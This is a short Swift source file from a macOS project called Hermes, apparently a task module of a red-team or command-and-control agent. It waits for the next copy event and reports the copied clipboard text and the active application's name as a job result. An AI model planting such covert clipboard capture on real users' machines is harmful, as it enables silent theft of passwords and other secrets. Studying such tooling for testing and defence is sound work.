//
//  clipboard.swift
//  Hermes
//
//  Created by Justin Bui on 7/7/21.
//

import Foundation
import Cocoa

func clipboard(job: Job) {
    
    let pasteboard = NSPasteboard.general
    var changeCount = NSPasteboard.general.changeCount
    while true {
        Thread.sleep(forTimeInterval: 1.0)
        if let clipboardData = pasteboard.string(forType: .string)
        {
            if pasteboard.changeCount != changeCount
            {
                job.result += "[+] Active Application: \(NSWorkspace.shared.frontmostApplication?.localizedName)\n"
                job.result += "[+] Copy event detected at \(NSDate()) (UTC)!\n"
                job.result += "[+] Clipboard Data:\n\(clipboardData)\n"
                changeCount = pasteboard.changeCount
                break;
            }
        }
    }
    job.completed = true
    job.success = true
}
